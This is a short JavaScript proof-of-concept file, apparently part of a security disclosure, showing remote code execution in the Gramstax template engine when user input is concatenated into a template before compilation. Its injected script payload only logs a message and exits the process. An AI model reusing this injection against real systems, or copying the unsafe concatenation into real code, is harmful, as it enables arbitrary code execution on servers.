/**
 * Case 4: Untrusted Template Input (RCE)
 *
 * This POC demonstrates the MOST DANGEROUS scenario: building the template
 * string itself using untrusted user input.
 *
 * Vulnerability: If a developer allows a user to provide text that is then
 * concatenated into the template string before compilation, the user can
 * inject any Gramstax tag, including <script> or execution blocks {~ ~}.
 *
 * Risk: Immediate and complete Remote Code Execution (RCE).
 */

import {TemplateEngine} from "../packages/gramstax/src/template/engine.js"

console.log(`--- CASE 4: UNTRUSTED TEMPLATE INPUT ---`)

// Imagine the developer allows a user to "customize" their welcome message
// by providing a string that is inserted directly into the template.
const userCustomMessage = `Welcome! <script> console.log("!!! VULNERABILITY ALERT: RCE via <script> tag !!!"); process.exit(); </script>`

// DANGEROUS: Concatenating user input into the template source
const maliciousTemplate = `
  <base>
    <message>
      ${userCustomMessage}
    </message>
  </base>
`

console.log(`Compiling malicious template...`)
// The engine will see the <script> tag and process it as a real instruction.
const messages = TemplateEngine.compileBlockMessage(maliciousTemplate)

console.log(`Executing compiled function...`)
messages.default.default({})
